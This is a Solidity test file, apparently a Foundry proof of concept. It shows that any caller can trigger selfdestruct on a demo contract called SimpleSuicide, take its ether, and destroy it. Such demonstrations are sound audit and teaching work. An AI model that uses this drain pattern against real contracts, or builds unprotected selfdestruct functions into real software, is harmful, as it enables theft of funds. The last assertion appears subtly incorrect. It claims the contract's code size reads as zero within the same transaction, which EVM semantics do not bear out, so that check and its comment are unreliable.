
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {SimpleSuicide} from "../src/SimpleSuicide.sol";

contract TestAccessControlSimpleSuicide is Test {
    SimpleSuicide public simpleSuicide;

    function setUp() public {
        simpleSuicide = new SimpleSuicide();
        // Fund the contract so we can verify selfdestruct transfers funds
        vm.deal(address(simpleSuicide), 1 ether);
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // --- 1. Constraints ---
        // Caller cannot be the test contract itself.
        vm.assume(caller != address(this));
        // Exclude the Zero Address
        vm.assume(caller != address(0));
        // Exclude Foundry Internals
        vm.assume(caller != address(vm));
        // Exclude the Console address
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // No privileged roles exist in this contract - anyone can call sudicideAnyone
        // This is the vulnerability we are demonstrating

        // --- 2. State Configuration ---
        // Record caller's balance before the attack
        uint256 callerBalanceBefore = caller.balance;
        uint256 contractBalance = address(simpleSuicide).balance;
        
        // Store the contract's code size before selfdestruct
        uint256 codeSizeBefore;
        address target = address(simpleSuicide);
        assembly {
            codeSizeBefore := extcodesize(target)
        }
        
        // Verify contract exists before the attack
        assertGt(codeSizeBefore, 0, "Contract should exist before selfdestruct");

        // --- 3. Execution & Assertion ---
        // Switch context to the arbitrary caller
        vm.prank(caller);

        // TRIGGER VULNERABILITY
        // Any arbitrary user can call sudicideAnyone and destroy the contract
        // This demonstrates unrestricted access to a critical method
        simpleSuicide.sudicideAnyone();

        // ASSERT SUCCESS - Verify the selfdestruct occurred
        // After selfdestruct, the contract's balance should be transferred to caller
        assertEq(
            caller.balance,
            callerBalanceBefore + contractBalance,
            "Caller should receive contract's funds after selfdestruct"
        );
        
        // Verify contract is destroyed (code size becomes 0 after selfdestruct in same tx context)
        uint256 codeSizeAfter;
        assembly {
            codeSizeAfter := extcodesize(target)
        }
        assertEq(codeSizeAfter, 0, "Contract should be destroyed after selfdestruct");
    }
}
